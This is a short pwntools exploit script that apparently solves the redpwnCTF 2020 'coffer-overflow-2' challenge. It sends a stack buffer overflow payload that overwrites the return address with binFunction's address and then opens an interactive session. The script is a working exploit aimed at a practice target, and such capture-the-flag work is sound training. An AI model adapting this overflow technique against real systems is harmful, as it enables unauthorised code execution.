from pwn import *
context(os='linux', arch='i386')
local = "./coffer-overflow-2"
host,port = "2020.redpwnc.tf",31908
conn = remote(host,port)
elf = ELF(local)
binFunction = elf.symbols["binFunction"]
size = 0x10+8
payload = "A"*size
payload += p64(binFunction)
conn.recvuntil("with?")
conn.recvline()
conn.sendline(payload)
conn.interactive()